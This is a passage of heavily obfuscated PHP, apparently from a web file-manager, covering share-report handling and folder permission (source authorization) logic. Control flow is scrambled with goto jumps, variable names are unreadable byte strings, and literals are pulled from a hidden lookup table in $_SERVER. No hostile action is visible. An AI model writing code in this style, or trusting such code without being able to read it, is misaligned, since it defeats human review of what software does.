reportList($e¬‹àçí¶Â) { goto a‡ºÊ•ò½‹; eÈœâî¹’: if (empty($e…õè„ÍÇá[$dàÓ‰¤åè˜[363]])) { return array(); } $this->_listDataApply($e…õè„ÍÇá[$dàÓ‰¤åè˜[363]]); return $e…õè„ÍÇá; goto A¹‡à‘ŸèÛ; Dó–†Šº¢Ó: $fñ©é£½¸Ó = array($dàÓ‰¤åè˜[419] => $dàÓ‰¤åè˜[420], $dàÓ‰¤åè˜[421] => $dàÓ‰¤åè˜[422]); $B²Úôç¥î = $dàÓ‰¤åè˜[1802] . $fñ©é£½¸Ó[$Dš¬Şº½ì‹]; $e…õè„ÍÇá = Model($dàÓ‰¤åè˜[1793])->where($C¨‡¬Ó„£¸)->order($B²Úôç¥î)->selectPage(20); goto eÈœâî¹’; f˜œ‘ƒÆ‚: if (isset($e¬‹àçí¶Â[$dàÓ‰¤åè˜[29]]) && in_array($e¬‹àçí¶Â[$dàÓ‰¤åè˜[29]], array($dàÓ‰¤åè˜[86], $dàÓ‰¤åè˜[1798], $dàÓ‰¤åè˜[1799], $dàÓ‰¤åè˜[1800], $dàÓ‰¤åè˜[1801]))) { $C¨‡¬Ó„£¸[$dàÓ‰¤åè˜[29]] = $e¬‹àçí¶Â[$dàÓ‰¤åè˜[29]]; } if (isset($e¬‹àçí¶Â[$dàÓ‰¤åè˜[683]]) && in_array($e¬‹àçí¶Â[$dàÓ‰¤åè˜[683]], array($dàÓ‰¤åè˜[486], $dàÓ‰¤åè˜[86], $dàÓ‰¤åè˜[1798], $dàÓ‰¤åè˜[1799]))) { $C¨‡¬Ó„£¸[$dàÓ‰¤åè˜[683]] = $e¬‹àçí¶Â[$dàÓ‰¤åè˜[683]]; } $Dš¬Şº½ì‹ = Input::get($dàÓ‰¤åè˜[425], $dàÓ‰¤åè˜[7], $dàÓ‰¤åè˜[1797], array($dàÓ‰¤åè˜[1722], $dàÓ‰¤åè˜[421])); goto Dó–†Šº¢Ó; a‡ºÊ•ò½‹: $dàÓ‰¤åè˜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¨‡¬Ó„£¸ = array(); if ($e¬‹àçí¶Â[$dàÓ‰¤åè˜[696]]) { $fˆ¶¦¯ÄË¨ = $e¬‹àçí¶Â[$dàÓ‰¤åè˜[465]] ? $e¬‹àçí¶Â[$dàÓ‰¤åè˜[465]] : strtotime(date($dàÓ‰¤åè˜[1795])); $C¨‡¬Ó„£¸[$dàÓ‰¤åè˜[192]] = array($dàÓ‰¤åè˜[329], array($e¬‹àçí¶Â[$dàÓ‰¤åè˜[696]], $fˆ¶¦¯ÄË¨)); } goto f˜œ‘ƒÆ‚; A¹‡à‘ŸèÛ: } public function reportStatus($bÆó‡ìÀÔ) { goto cÀöØ­‘ä; B‡›Å¬‚‰Å: $DöˆŸî÷çÖ = Model($B×¸ÓãíÀè[1793])->where($b‚µˆ®„êŠ)->save($cµ¿¾ó¥ÉÎ); if ($bÆó‡ìÀÔ[$B×¸ÓãíÀè[683]] == $B×¸ÓãíÀè[1798]) { if ($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[436]] != $B×¸ÓãíÀè[486] && $this->shareFileMeta($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[436]])) { $this->shareFileMeta($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[436]], 0); } $this->remove($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[457]]); return !0; } if ($DöˆŸî÷çÖ && $bÆó‡ìÀÔ[$B×¸ÓãíÀè[683]] == $B×¸ÓãíÀè[1799]) { $eãŠàËÊÍô = $cµ¿¾ó¥ÉÎ[$B×¸ÓãíÀè[683]] == $B×¸ÓãíÀè[1799] ? 1 : 0; $this->shareFileMeta($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[436]], $eãŠàËÊÍô); $this->removeByFile($Cß„Á˜âĞ¨[$B×¸ÓãíÀè[436]]); } goto Cƒ—¨ÚÄ©‚; Cƒ—¨ÚÄ©‚: return $DöˆŸî÷çÖ; goto a¡Í¼È»é; cÀöØ­‘ä: $B×¸ÓãíÀè =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b‚µˆ®„êŠ = array($B×¸ÓãíÀè[385] => $bÆó‡ìÀÔ[$B×¸ÓãíÀè[385]]); $Cß„Á˜âĞ¨ = Model($B×¸ÓãíÀè[1793])->where($b‚µˆ®„êŠ)->field($B×¸ÓãíÀè[1803])->find(); goto F‹ãÁ§Ö†™; F‹ãÁ§Ö†™: if (!$Cß„Á˜âĞ¨) { return !1; } $cµ¿¾ó¥ÉÎ = array($B×¸ÓãíÀè[683] => $bÆó‡ìÀÔ[$B×¸ÓãíÀè[683]]); if ($bÆó‡ìÀÔ[$B×¸ÓãíÀè[683]] == $B×¸ÓãíÀè[1799] && $Cß„Á˜âĞ¨[$B×¸ÓãíÀè[683]] == $B×¸ÓãíÀè[1799]) { $cµ¿¾ó¥ÉÎ[$B×¸ÓãíÀè[683]] = 0; } goto B‡›Å¬‚‰Å; a¡Í¼È»é: } private function removeByFile($c‰éÉ¥±–‰) { goto EÔ’ í™÷; Ağõ¤øâ·¬: $fŒìÆ˜ò¤Ó = array($cÇ‹ÁìÍÒ„[387] => array($cÇ‹ÁìÍÒ„[7], $AÊ®±ÄòÑÄ), $cÇ‹ÁìÍÒ„[462] => 1); $Cùºâåˆï© = Model($cÇ‹ÁìÍÒ„[1615])->where($fŒìÆ˜ò¤Ó)->field($cÇ‹ÁìÍÒ„[457])->select(); if (empty($Cùºâåˆï©)) { return; } goto dè¾ãÉ¤˜ï; EÔ’ í™÷: $cÇ‹ÁìÍÒ„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cùºâåˆï© = Model($cÇ‹ÁìÍÒ„[745])->where(array($cÇ‹ÁìÍÒ„[436] => $c‰éÉ¥±–‰))->field($cÇ‹ÁìÍÒ„[387])->select(); $AÊ®±ÄòÑÄ = array_to_keyvalue($Cùºâåˆï©, $cÇ‹ÁìÍÒ„[33], $cÇ‹ÁìÍÒ„[387]); goto Ağõ¤øâ·¬; dè¾ãÉ¤˜ï: $A±ŞìŒ¼ = array_to_keyvalue($Cùºâåˆï©, $cÇ‹ÁìÍÒ„[33], $cÇ‹ÁìÍÒ„[457]); $this->remove($A±ŞìŒ¼); goto FæÕÑÑêÉà; FæÕÑÑêÉà: } private function shareFileMeta($a¨ªÃßø©, $Cğºèáå‘‚ = null) { $E Š‰áàÁƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $báÃºœÆœâ = array($E Š‰áàÁƒ[436] => $a¨ªÃßø©, $E Š‰áàÁƒ[92] => $E Š‰áàÁƒ[1804]); if (is_null($Cğºèáå‘‚)) { return Model($E Š‰áàÁƒ[1805])->where($báÃºœÆœâ)->find(); } $báÃºœÆœâ[$E Š‰áàÁƒ[368]] = $Cğºèáå‘‚; Model($E Š‰áàÁƒ[1805])->add($báÃºœÆœâ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\x65\137\x61\165\164\150"; public function getAuth($fŠ˜×ÌŒõ‘) { goto Bæ²ô¡°¡‹; Bæ²ô¡°¡‹: $dœ¯áíÙŒÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c„êæñÍÖ­ = $this->sourceAuthSelect($fŠ˜×ÌŒõ‘); $Dº”ŞÂ­²¸ = array(); goto dõó««Ò; B’è¾Ì‰”ò: array_multisort($Fª‰õà–‡â, SORT_DESC, $Dº”ŞÂ­²¸); return $Dº”ŞÂ­²¸; goto fÜÃ•ÀÏÓÉ; dõó««Ò: $Fª‰õà–‡â = array(); $B«†Ì„°Õ = 2 << 25; foreach ($c„êæñÍÖ­ as $eŞ‰ÀÁ÷Ìë) { goto FËƒ’ˆŞ†; D”Â—­ŞÙä: $BÅØ°¥¥¶Œ = 0; if ($eŞ‰ÀÁ÷Ìë[$dœ¯áíÙŒÜ[389]] == SourceModel::TYPE_GROUP) { $BÅØ°¥¥¶Œ = $B«†Ì„°Õ * 2; } if ($eŞ‰ÀÁ÷Ìë[$dœ¯áíÙŒÜ[389]] == SourceModel::TYPE_USER) { $BÅØ°¥¥¶Œ = $B«†Ì„°Õ; } goto eËêŠöÀ»É; eËêŠöÀ»É: if ($eŞ‰ÀÁ÷Ìë[$dœ¯áíÙŒÜ[389]] == SourceModel::TYPE_USER && $eŞ‰ÀÁ÷Ìë[$dœ¯áíÙŒÜ[474]] == $dœ¯áíÙŒÜ[486]) { $BÅØ°¥¥¶Œ = 0; } $Fª‰õà–‡â[] = $dÁŞ’Â×[$dœ¯áíÙŒÜ[394]] + $BÅØ°¥¥¶Œ; goto fÉ‹ƒ§°ší; FËƒ’ˆŞ†: $dÁŞ’Â× = Model($dœ¯áíÙŒÜ[1806])->listData($eŞ‰ÀÁ÷Ìë[$dœ¯áíÙŒÜ[1787]]); if (!$dÁŞ’Â×) { continue; } $Dº”ŞÂ­²¸[] = $eŞ‰ÀÁ÷Ìë; goto D”Â—­ŞÙä; fÉ‹ƒ§°ší: } goto B’è¾Ì‰”ò; fÜÃ•ÀÏÓÉ: } public function sourceAuthSelect($cƒ‘ŞË‰«ğ) { goto C´Ïë£¥£; C´Ïë£¥£: $b–øò˜ˆ“ç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $a ©Í“…æ¥ = array(); $EÆ¦‘Ş« = is_array($cƒ‘ŞË‰«ğ) ? !1 : !0; goto B³†‡¸×àæ; a“¿·©ƒğò: $fí¬äÎÕøí = $this->field($DƒáÌº…æ)->order($b–øò˜ˆ“ç[385])->where($EØ†âˆ¶Ì°)->select(); $BØ²Ã¦¤Ã· = array_to_keyvalue_group($fí¬äÎÕøí, $b–øò˜ˆ“ç[387]); foreach ($cƒ‘ŞË‰«ğ as $Bƒ»·ÔŞ‡é) { $a ©Í“…æ¥[$Bƒ»·ÔŞ‡é] = $BØ²Ã¦¤Ã·[$Bƒ»·ÔŞ‡é] ? $BØ²Ã¦¤Ã·[$Bƒ»·ÔŞ‡é] : array(); } goto F¢½Í†Ş¶; b¶è¡¬œã: if (count($E±—¢‘È‚) == count($cƒ‘ŞË‰«ğ)) { return $EÆ¦‘Ş« ? $E±—¢‘È‚[$cƒ‘ŞË‰«ğ[0]] : $E±—¢‘È‚; } $DƒáÌº…æ = $b–øò˜ˆ“ç[1807]; $EØ†âˆ¶Ì° = array($b–øò˜ˆ“ç[387] => array($b–øò˜ˆ“ç[7], $cƒ‘ŞË‰«ğ)); goto a“¿·©ƒğò; B³†‡¸×àæ: if ($EÆ¦‘Ş«) { $cƒ‘ŞË‰«ğ = array($cƒ‘ŞË‰«ğ); } $E±—¢‘È‚ = array(); foreach ($cƒ‘ŞË‰«ğ as $Bƒ»·ÔŞ‡é) { if (isset($a ©Í“…æ¥[$Bƒ»·ÔŞ‡é])) { $E±—¢‘È‚[$Bƒ»·ÔŞ‡é] = $a ©Í“…æ¥[$Bƒ»·ÔŞ‡é]; } } goto b¶è¡¬œã; F¢½Í†Ş¶: if ($EÆ¦‘Ş«) { return $fí¬äÎÕøí; } return $BØ²Ã¦¤Ã·; goto E‹êŞ„ö‹ê; E‹êŞ„ö‹ê: } public function setAuth($BŸÁ¿ŠÊ”¿, $fÓİÛ¢øÙ) { goto BœŞƒÚÖí; eîí•çÂ¨: if ($f›ßãÄœ[$dË¤à£í‡Û[389]] != SourceModel::TYPE_GROUP) { return !1; } $déŞ÷ßÓÛ© = 1; $føÚã‹ò« = $f›ßãÄœ[$dË¤à£í‡Û[474]]; goto EñÅ…‰´õ; b™ïŞ¥¶§š: foreach ($fÓİÛ¢øÙ as $E·÷·©¸±) { if (!in_array($E·÷·©¸±[$dË¤à£í‡Û[389]], $a‘¨¾êŒåñ)) { show_json(LNG($dË¤à£í‡Û[1808]), !1); } if ($føÚã‹ò« != $déŞ÷ßÓÛ©) { if ($E·÷·©¸±[$dË¤à£í‡Û[389]] == SourceModel::TYPE_GROUP) { } if ($E·÷·©¸±[$dË¤à£í‡Û[474]] != 0 && !in_array($E·÷·©¸±[$dË¤à£í‡Û[474]], $FÖŒù¼ß˜Û)) { } } if ($E·÷·©¸±[$dË¤à£í‡Û[474]] == 0) { $E·÷·©¸±[$dË¤à£í‡Û[389]] = SourceModel::TYPE_USER; } $fãŞ½óÅ[] = array($dË¤à£í‡Û[387] => $BŸÁ¿ŠÊ”¿, $dË¤à£í‡Û[389] => intval($E·÷·©¸±[$dË¤à£í‡Û[389]]), $dË¤à£í‡Û[474] => intval($E·÷·©¸±[$dË¤à£í‡Û[474]]), $dË¤à£í‡Û[1787] => intval($E·÷·©¸±[$dË¤à£í‡Û[1787]]) ? intval($E·÷·©¸±[$dË¤à£í‡Û[1787]]) : 0, $dË¤à£í‡Û[1788] => intval($E·÷·©¸±[$dË¤à£í‡Û[1788]]) ? intval($E·÷·©¸±[$dË¤à£í‡Û[1788]]) : -1); } $this->where(array($dË¤à£í‡Û[401] => $BŸÁ¿ŠÊ”¿))->delete(); $this->addAll($fãŞ½óÅ); goto eíÆµœ¿Ó; eíÆµœ¿Ó: return !0; goto Fˆë¥­ñ¨ç; BœŞƒÚÖí: $dË¤à£í‡Û =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f›ßãÄœ = Model($dË¤à£í‡Û[1154])->sourceInfo($BŸÁ¿ŠÊ”¿); if (!$f›ßãÄœ) { return !1; } goto eîí•çÂ¨; EñÅ…‰´õ: if ($føÚã‹ò« != $déŞ÷ßÓÛ©) { $E” ÛÌÔ®Ú = array($dË¤à£í‡Û[1638] => $føÚã‹ò«); $FÖŒù¼ß˜Û = Model($dË¤à£í‡Û[1721])->field($dË¤à£í‡Û[1479])->where($E” ÛÌÔ®Ú)->select(); $FÖŒù¼ß˜Û = array_to_keyvalue($FÖŒù¼ß˜Û, $dË¤à£í‡Û[33], $dË¤à£í‡Û[1479]); } $a‘¨¾êŒåñ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fãŞ½óÅ = array(); goto b™ïŞ¥¶§š; Fˆë¥­ñ¨ç: } public function authClear($bÔ·†ßÄœ) { $a‘òë›æ¥à =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÈ¦øõ£Ê = Model($a‘òë›æ¥à[1154])->sourceInfo($bÔ·†ßÄœ); $f«™„¢çÀã = array($bÔ·†ßÄœ); if ($eÈ¦øõ£Ê[$a‘òë›æ¥à[388]] == $a‘òë›æ¥à[86]) { $FĞ‚ù”Ÿ¿Ì = array($a‘òë›æ¥à[542] => array($a‘òë›æ¥à[501], $eÈ¦øõ£Ê[$a‘òë›æ¥à[477]] . $bÔ·†ßÄœ . $a‘òë›æ¥à[502])); $f«™„¢çÀã = Model($a‘òë›æ¥à[1154])->field($a‘òë›æ¥à[401])->where($FĞ‚ù”Ÿ¿Ì)->getField($a‘òë›æ¥à[387], !0); $f«™„¢çÀã[] = $bÔ·†ßÄœ; } $this->where(array($a‘òë›æ¥à[401] => array($a‘òë›æ¥à[402], $f«™„¢çÀã)))->delete(); return !0; } public function getAllChildren($DÍö–‘µË) { goto eÊî¼íÏ×–; a±Æ‹öÒ°°: if ($c•´ÔÊæØ[$EÛíã¬³¯ö[479]] == $EÛíã¬³¯ö[486] && $c•´ÔÊæØ[$EÛíã¬³¯ö[474]] != $B ”Åè«¿µ) { $AÔ‘‚‘ğÇ = $this->groupChidldAllRootSource($c•´ÔÊæØ[$EÛíã¬³¯ö[474]]); } $bî®ø‡Ó„Ñ = $this->field($EÛíã¬³¯ö[387])->group($EÛíã¬³¯ö[387])->select(); $bî®ø‡Ó„Ñ = array_to_keyvalue($bî®ø‡Ó„Ñ, $EÛíã¬³¯ö[33], $EÛíã¬³¯ö[387]); goto Døâßˆ²×¡; eÊî¼íÏ×–: $EÛíã¬³¯ö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c•´ÔÊæØ = Model($EÛíã¬³¯ö[1154])->sourceInfo($DÍö–‘µË); if ($c•´ÔÊæØ[$EÛíã¬³¯ö[388]] != $EÛíã¬³¯ö[86]) { return $this->sourceListAuth(array($DÍö–‘µË)); } goto c÷Şœ‚Ñ¾Ü; f»ËøœÕ‹¬: return $this->sourceListAuth($eÓëë†ƒ—); goto BÅ›ª²ŸÔ«; c÷Şœ‚Ñ¾Ü: if ($c•´ÔÊæØ[$EÛíã¬³¯ö[389]] != SourceModel::TYPE_GROUP) { return array(); } $B ”Åè«¿µ = 1; $AÔ‘‚‘ğÇ = array($DÍö–‘µË); goto a±Æ‹öÒ°°; f–®‹„Íšˆ: $dï„™ ¹ = Model($EÛíã¬³¯ö[745])->field($A’Şº¥ô)->where($E×«Ûå‘é·)->select(); $eÓëë†ƒ— = array($DÍö–‘µË); foreach ($dï„™ ¹ as $B¬˜éñ¥É„) { foreach ($AÔ‘‚‘ğÇ as $cä‚°Öƒê²) { $f×‘‰İ§±® = $EÛíã¬³¯ö[47] . $cä‚°Öƒê² . $EÛíã¬³¯ö[47]; $cÆÂ‰¾àİ = $B¬˜éñ¥É„[$EÛíã¬³¯ö[477]] . $B¬˜éñ¥É„[$EÛíã¬³¯ö[387]] . $EÛíã¬³¯ö[47]; if (strstr($cÆÂ‰¾àİ, $f×‘‰İ§±®)) { $eÓëë†ƒ—[] = $B¬˜éñ¥É„[$EÛíã¬³¯ö[387]]; break; } } } goto f»ËøœÕ‹¬; Døâßˆ²×¡: if (!$bî®ø‡Ó„Ñ) { return array(); } $A’Şº¥ô = $EÛíã¬³¯ö[1809]; $E×«Ûå‘é· = array($EÛíã¬³¯ö[387] => array($EÛíã¬³¯ö[7], $bî®ø‡Ó„Ñ), $EÛíã¬³¯ö[414] => $EÛíã¬³¯ö[486]); goto f–®‹„Íšˆ; BÅ›ª²ŸÔ«: } private function sourceListAuth($FîÆİÛµìÈ) { goto f­â ‰; e…ö§ù¼¥: $d­ö®»µˆÃ = array(); $dÍİå÷™†© = array(); foreach ($DÖÇ‘öÕ– as $e¹Á“ø«Öè) { goto Bˆ½å›õ; dÎ“¹ÒËÊ‡: $e¹Á“ø«Öè[$b¾´†ÑÕÈ­[1810]] = $this->authTargetInfo($c†ôº´³…ğ); $e¹Á“ø«Öè[$b¾´†ÑÕÈ­[484]] = rtrim($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[480]], $b¾´†ÑÕÈ­[8]) . $b¾´†ÑÕÈ­[8] . ltrim($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[484]], $b¾´†ÑÕÈ­[8]); $d­ö®»µˆÃ[] = $e¹Á“ø«Öè; goto C¯Î‰³; Bˆ½å›õ: unset($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[397]]); unset($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[396]]); unset($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[394]]); goto CÚî³ù¦¶š; C¯Î‰³: $FÙœ…Ğ±‰ô = count(explode($b¾´†ÑÕÈ­[8], trim($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[484]], $b¾´†ÑÕÈ­[8]))); $dÍİå÷™†©[] = $FÙœ…Ğ±‰ô + ($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[29]] == $b¾´†ÑÕÈ­[76] ? 0 : 1000); goto DÙ˜‡Šç’; CÚî³ù¦¶š: unset($e¹Á“ø«Öè[$b¾´†ÑÕÈ­[84]]); $c†ôº´³…ğ = $e×ˆÆÅº›Ï[$e¹Á“ø«Öè[$b¾´†ÑÕÈ­[387]]]; if (!$c†ôº´³…ğ) { continue; } goto dÎ“¹ÒËÊ‡; DÙ˜‡Šç’: } goto F‡ÑÇ¤¤“—; f­â ‰: $b¾´†ÑÕÈ­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÖÇ‘öÕ– = Model($b¾´†ÑÕÈ­[1154])->sourceListInfo($FîÆİÛµìÈ, !0); $e×ˆÆÅº›Ï = $this->sourceAuthSelect($FîÆİÛµìÈ); goto e…ö§ù¼¥; F‡ÑÇ¤¤“—: array_multisort($dÍİå÷™†©, SORT_ASC, $d­ö®»µˆÃ); return $d­ö®»µˆÃ; goto B£»›éò’¥; B£»›éò’¥: } private function groupChidldAllRootSource($FŠíÎÇ¿ô¬) { $F‰İÌôÔ™· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dİ§Í÷òõß = Model($F‰İÌôÔ™·[1811])->groupChildrenAll($FŠíÎÇ¿ô¬); $cá³Êğ¥îê = array($F‰İÌôÔ™·[479] => 0, $F‰İÌôÔ™·[474] => array($F‰İÌôÔ™·[7], $dİ§Í÷òõß), $F‰İÌôÔ™·[389] => SourceModel::TYPE_GROUP); $dÎ©ÔÖ = Model($F‰İÌôÔ™·[745])->field($F‰İÌôÔ™·[387])->where($cá³Êğ¥îê)->select(); $dÎ©ÔÖ = array_to_keyvalue($dÎ©ÔÖ, $F‰İÌôÔ™·[33], $F‰İÌôÔ™·[387]); return $dÎ©ÔÖ; } private function authTargetInfo($d§Õ’ëåãò) { goto bòˆ‡ºõñê; bòˆ‡ºõñê: $eò†ğ–«ïØ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C§˜áÂŸ¾“ = array(); $cÉ™µ¶îˆ = array(); goto aâ†¸ŒÑŸß; aâ†¸ŒÑŸß: $bô‡Üì†¡ = 2 << 25; foreach ($d§Õ’ëåãò as $E´éÈ†…¼) { goto e’¾æêï„¹; e’¾æêï„¹: $E˜‡š¨»Êõ = Model($eò†ğ–«ïØ[1806])->listData($E´éÈ†…¼[$eò†ğ–«ïØ[1787]]); if (!$E˜‡š¨»Êõ) { continue; } if ($E´éÈ†…¼[$eò†ğ–«ïØ[389]] == SourceModel::TYPE_USER) { $bñ‰ƒÑ¤ = Model($eò†ğ–«ïØ[492])->getInfoSimpleOuter($E´éÈ†…¼[$eò†ğ–«ïØ[474]]); if ($bñ‰ƒÑ¤[$eò†ğ–«ïØ[1479]] == $eò†ğ–«ïØ[1036]) { continue; } if ($bñ‰ƒÑ¤[$eò†ğ–«ïØ[1479]] == $eò†ğ–«ïØ[486]) { $bñ‰ƒÑ¤[$eò†ğ–«ïØ[28]] = LNG($eò†ğ–«ïØ[1812]); } } else { $bñ‰ƒÑ¤ = Model($eò†ğ–«ïØ[476])->getInfoSimple($E´éÈ†…¼[$eò†ğ–«ïØ[474]]); } goto fÒÃ†º¥®¶; cÒÍçáÀ› : $CÆä³’ÅÂô = 0; if ($E´éÈ†…¼[$eò†ğ–«ïØ[389]] == SourceModel::TYPE_GROUP) { $CÆä³’ÅÂô = $bô‡Üì†¡ * 2; } if ($E´éÈ†…¼[$eò†ğ–«ïØ[389]] == SourceModel::TYPE_USER) { $CÆä³’ÅÂô = $bô‡Üì†¡; } goto F°§ÍøèØ¤; fÒÃ†º¥®¶: if (!$bñ‰ƒÑ¤) { continue; } $bñ‰ƒÑ¤[$eò†ğ–«ïØ[435]] = $E˜‡š¨»Êõ; $C§˜áÂŸ¾“[] = $bñ‰ƒÑ¤; goto cÒÍçáÀ› ; F°§ÍøèØ¤: if ($E´éÈ†…¼[$eò†ğ–«ïØ[389]] == SourceModel::TYPE_USER && $E´éÈ†…¼[$eò†ğ–«ïØ[474]] == $eò†ğ–«ïØ[486]) { $CÆä³’ÅÂô = 0; } $cÉ™µ¶îˆ[] = $E˜‡š¨»Êõ[$eò†ğ–«ïØ[394]] + $CÆä³’ÅÂô; goto Dùõ†¯È¢; Dùõ†¯È¢: } array_multisort($cÉ™µ¶îˆ, SORT_DESC, $C§˜áÂŸ¾“); goto bš™ÒŒ¦Ì¹; bš™ÒŒ¦Ì¹: return $C§˜áÂŸ¾“; goto AÑ½ùôîµõ; AÑ½ùôîµõ: } public function getAllChildrenByUser($b¥®Š´àÅ‰, $FÒ“ªÛ©Ÿå) { goto B„â‘¨; eî‘ â±Œ”: if ($a„æš¾´[$d§ˆç°„Ù…[479]] == $d§ˆç°„Ù…[486] && $a„æš¾´[$d§ˆç°„Ù…[474]] != $BòŒí›Ë’â && $this->groupContainUser($a„æš¾´[$d§ˆç°„Ù…[474]], $FÒ“ªÛ©Ÿå)) { foreach ($E¦ğ˜Ó»Ã[$d§ˆç°„Ù…[1813]] as $AÀß©½Ïà) { $C†¶ñ¤îß´ = Model($d§ˆç°„Ù…[476])->getInfo($AÀß©½Ïà[$d§ˆç°„Ù…[1638]]); $bâ¤“öÕƒ = Model($d§ˆç°„Ù…[495])->getInfoSimpleOuter($FÒ“ªÛ©Ÿå); $bâ¤“öÕƒ[$d§ˆç°„Ù…[435]] = $AÀß©½Ïà[$d§ˆç°„Ù…[394]]; if (Model($d§ˆç°„Ù…[1806])->authCheckAction($AÀß©½Ïà[$d§ˆç°„Ù…[394]][$d§ˆç°„Ù…[394]], $d§ˆç°„Ù…[1658])) { continue; } $BÃ±…°¸ = array($d§ˆç°„Ù…[28] => $d§ˆç°„Ù…[1431] . $C†¶ñ¤îß´[$d§ˆç°„Ù…[28]], $d§ˆç°„Ù…[387] => $C†¶ñ¤îß´[$d§ˆç°„Ù…[84]][$d§ˆç°„Ù…[387]], $d§ˆç°„Ù…[75] => KodIO::make($C†¶ñ¤îß´[$d§ˆç°„Ù…[84]][$d§ˆç°„Ù…[387]]), $d§ˆç°„Ù…[479] => $d§ˆç°„Ù…[486], $d§ˆç°„Ù…[389] => $d§ˆç°„Ù…[967], $d§ˆç°„Ù…[29] => $d§ˆç°„Ù…[506], $d§ˆç°„Ù…[484] => $C†¶ñ¤îß´[$d§ˆç°„Ù…[481]], $d§ˆç°„Ù…[1638] => $C†¶ñ¤îß´[$d§ˆç°„Ù…[1638]], $d§ˆç°„Ù…[478] => $C†¶ñ¤îß´[$d§ˆç°„Ù…[479]], $d§ˆç°„Ù…[1810] => array($bâ¤“öÕƒ)); $CíäŠ¾³í[$BÃ±…°¸[$d§ˆç°„Ù…[387]]] = $BÃ±…°¸; } } $eã”¸Õò = array(); $A‡« …Û‡Ä = $this->getAllChildren($b¥®Š´àÅ‰); goto d§ª´ÛÇÚ; d”·ÀÕğË: return $eã”¸Õò; goto d­Ş§šç©Ë; b†é“’Äº: $a„æš¾´ = Model($d§ˆç°„Ù…[1154])->sourceInfo($b¥®Š´àÅ‰); $CíäŠ¾³í = array(); $BòŒí›Ë’â = 1; goto eî‘ â±Œ”; B„â‘¨: $d§ˆç°„Ù… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¦ğ˜Ó»Ã = Model($d§ˆç°„Ù…[495])->getInfo($FÒ“ªÛ©Ÿå); if (!$FÒ“ªÛ©Ÿå || !$b¥®Š´àÅ‰ || !$E¦ğ˜Ó»Ã) { return array(); } goto b†é“’Äº; d§ª´ÛÇÚ: foreach ($A‡« …Û‡Ä as $d÷¥¿ª•‘) { $Aªà—ÊËÂ = !1; foreach ($d÷¥¿ª•‘[$d§ˆç°„Ù…[1810]] as $DØ‘”Û§ëó) { if ($DØ‘”Û§ëó[$d§ˆç°„Ù…[1479]]) { if ($DØ‘”Û§ëó[$d§ˆç°„Ù…[1479]] == $FÒ“ªÛ©Ÿå) { $Aªà—ÊËÂ = !0; break; } } if ($DØ‘”Û§ëó[$d§ˆç°„Ù…[1638]]) { if ($this->groupContainUser($DØ‘”Û§ëó[$d§ˆç°„Ù…[1638]], $FÒ“ªÛ©Ÿå)) { $Aªà—ÊËÂ = !0; break; } } } if ($Aªà—ÊËÂ) { $eã”¸Õò[] = $d÷¥¿ª•‘; } $F•î›Ê„ˆ¥ = $d÷¥¿ª•‘[$d§ˆç°„Ù…[387]]; if (isset($CíäŠ¾³í[$F•î›Ê„ˆ¥])) { $d÷¥¿ª•‘[$d§ˆç°„Ù…[1810]][] = $CíäŠ¾³í[$F•î›Ê„ˆ¥][0]; $CíäŠ¾³í[$F•î›Ê„ˆ¥] = !1; } } $CíäŠ¾³í = array_filter(array_values($CíäŠ¾³í)); $eã”¸Õò = array_merge($CíäŠ¾³í, $eã”¸Õò); goto d”·ÀÕğË; d­Ş§šç©Ë: } public function setAllChildrenByUser($fÙã©ĞäÕ°, $E‰ó©–—‘Ï, $fÜî´šÌ¢İ) { $EğéÆ¿³ƒà =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AØ—àÔ‹è£ = $this->getAllChildrenByUser($fÙã©ĞäÕ°, $E‰ó©–—‘Ï); if (!$fÜî´šÌ¢İ || !$AØ—àÔ‹è£) { return !1; } foreach ($AØ—àÔ‹è£ as $eô®©°»µ) { $Dì‡±¡ˆÁñ = array(); foreach ($eô®©°»µ[$EğéÆ¿³ƒà[1810]] as $CÖÓë«³›ã) { $Bßê›©†Å = $CÖÓë«³›ã[$EğéÆ¿³ƒà[435]]; $BÚ÷ïˆ”±Ç = $CÖÓë«³›ã[$EğéÆ¿³ƒà[1479]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $D’·—»©Œ± = $CÖÓë«³›ã[$EğéÆ¿³ƒà[1479]] ? $CÖÓë«³›ã[$EğéÆ¿³ƒà[1479]] : $CÖÓë«³›ã[$EğéÆ¿³ƒà[1638]]; if ($CÖÓë«³›ã[$EğéÆ¿³ƒà[1479]] && $CÖÓë«³›ã[$EğéÆ¿³ƒà[1479]] == $E‰ó©–—‘Ï) { continue; } $Dì‡±¡ˆÁñ[] = array($EğéÆ¿³ƒà[387] => $eô®©°»µ[$EğéÆ¿³ƒà[387]], $EğéÆ¿³ƒà[389] => $BÚ÷ïˆ”±Ç, $EğéÆ¿³ƒà[474] => intval($D’·—»©Œ±), $EğéÆ¿³ƒà[1787] => isset($Bßê›©†Å[$EğéÆ¿³ƒà[385]]) ? intval($Bßê›©†Å[$EğéÆ¿³ƒà[385]]) : 0, 